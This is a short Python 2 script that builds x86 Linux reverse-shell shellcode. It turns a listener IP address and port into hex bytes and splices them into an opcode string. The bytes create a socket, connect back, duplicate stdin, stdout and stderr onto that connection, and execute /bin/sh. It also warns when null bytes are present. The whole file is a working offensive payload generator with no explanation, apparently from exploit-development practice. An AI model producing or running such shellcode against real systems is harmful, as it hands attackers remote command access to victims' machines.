import os
import sys

def generate_shellcode(portNumberHexUpper, portNumberHexLower, firstOctetHex, secondOctetHex, thirdOctetHex, fourthOctetHex):

    shellcode = "\\x6a\\x66\\x58\\x31\\xdb\\x43\\x31\\xd2\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x6a\\x66\\x58\\x68%s%s%s%s\\x66\\x68%s%s\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\x43\\xcd\\x80\\x89\\xfb\\x31\\xc9\\x6a\\x3f\\x58\\xcd\\x80\\x41\\x80\\xf9\\x02\\x7e\\xf5\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80" % (firstOctetHex, secondOctetHex, thirdOctetHex, fourthOctetHex, portNumberHexUpper, portNumberHexLower)

    print "Generating shellcode...\n"
    print shellcode + "\n"

def main():
    if len(sys.argv) != 3:
        print "(+) usage: %s <listener_IP> <listener_port>" % sys.argv[0]
        print '(+) eg: %s 192.168.10.20 9999' % sys.argv[0]
        sys.exit(-1)

    portNumber = int(sys.argv[2])
    if 0 <= portNumber <= 65535:
        portNumberHex = "%04x" % portNumber
        portNumberHexUpper = "\\x" + str(portNumberHex[0:2])
        portNumberHexLower = "\\x" + str(portNumberHex[2:4])

        IP = sys.argv[1]
        IP_octets = IP.split(".")

        if (int(IP_octets[0]) == 00 or int(IP_octets[1]) == 00 or int(IP_octets[2]) == 00 or int(IP_octets[3]) == 00):
            print "(!) WARNING: null bytes detected, the shellcode may not work...\n"

        firstOctetHex = "\\x" + "%02x" % int(IP_octets[0])
        secondOctetHex = "\\x" + "%02x" % int(IP_octets[1])
        thirdOctetHex = "\\x" + "%02x" % int(IP_octets[2])
        fourthOctetHex = "\\x" + "%02x" % int(IP_octets[3])

        generate_shellcode(portNumberHexUpper, portNumberHexLower, firstOctetHex, secondOctetHex, thirdOctetHex, fourthOctetHex)

    else:
        print "(+) Please enter a port number between 0 and 65535\n"
        sys.exit(-1)  

if __name__ == "__main__":
    main()